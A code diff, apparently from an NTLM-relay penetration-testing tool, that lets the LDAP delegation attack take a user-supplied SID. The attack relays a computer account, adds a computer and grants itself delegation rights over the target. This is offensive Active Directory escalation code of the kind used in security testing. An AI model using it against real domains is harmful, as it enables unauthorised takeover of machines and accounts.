@@ -187,7 +187,7 @@ class LDAPAttack(ProtocolAttack):
         else:
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
 
-    def delegateAttack(self, usersam, targetsam, domainDumper):
+    def delegateAttack(self, usersam, targetsam, domainDumper, sid):
         global delegatePerformed
         if targetsam in delegatePerformed:
             LOG.info('Delegate attack already performed for this computer, skipping')
@@ -197,12 +197,15 @@ class LDAPAttack(ProtocolAttack):
             usersam = self.addComputer('CN=Computers,%s' % domainDumper.root, domainDumper)
             self.config.escalateuser = usersam
 
-        # Get escalate user sid
-        result = self.getUserInfo(domainDumper, usersam)
-        if not result:
-            LOG.error('User to escalate does not exist!')
-            return
-        escalate_sid = str(result[1])
+        if not sid:
+            # Get escalate user sid
+            result = self.getUserInfo(domainDumper, usersam)
+            if not result:
+                LOG.error('User to escalate does not exist!')
+                return
+            escalate_sid = str(result[1])
+        else:
+            escalate_sid = usersam
 
         # Get target computer DN
         result = self.getUserInfo(domainDumper, targetsam)
@@ -577,7 +580,7 @@ class LDAPAttack(ProtocolAttack):
 
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
-            self.delegateAttack(self.config.escalateuser, self.username, domainDumper)
+            self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
             return
 
         # Add a new computer if that is requested
